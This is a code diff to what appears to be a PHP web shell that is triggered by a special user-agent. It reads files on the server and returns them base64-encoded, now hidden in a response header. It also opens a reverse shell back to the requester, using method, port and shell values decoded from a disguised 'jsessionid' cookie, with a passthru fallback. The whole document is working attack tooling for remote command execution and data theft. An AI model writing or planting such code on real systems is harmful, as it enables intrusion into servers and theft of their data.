@@ -144,7 +144,7 @@ function b64($data, $switch)
         }
     }else{
         if (is_file($data['read'])){
-            echo base64_encode(file_get_contents($data['read']));
+            header("FileName: ".base64_encode(file_get_contents($data['read'])));
             return true;
         }
     }
@@ -294,12 +294,13 @@ function reverseConnections($methods, $host, $port, $shell)
         echo("\nAttempting to connect back, ensure you have the listener running.\n");
         echo("\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
         system($comma[$methods]);
+        return 1;
     } else {
         echo("\nYou didnt specify a method to use, defaulting to bash.\n");
         echo("\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
         system($useMethod);
+        return 1;
     }
-
 }
 
 function executeCommands($com, int $run)
@@ -399,14 +400,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
             b64($axD, $aSX[0]);
         }
     } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['jsessionid']) {
+        $splitter = explode(".", base64_decode($_COOKIE['jsessionid']));
+        if (function_exists(pcntl_fork()) === true){
         $pid = pcntl_fork();
-        if ($pid === -1){
+        if ($pid === -1) {
             die("\n\n");
-        }else {
+        } else {
             pcntl_wait($status);
-            $splitter = explode(".", base64_decode($_COOKIE['r']));
             reverseConnections($splitter[0], $_SERVER['REMOTE_ADDR'], $splitter[1], $splitter[2]);
             exit(0);
+            }
+        }else{
+            echo "Cannot fork, as it does not exist on this system..... using passthru\n";
+            $re = null;
+            passthru(reverseConnections($splitter[0], $_SERVER['REMOTE_ADDR'], $splitter[1], $splitter[2]), $re);
         }
     }
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
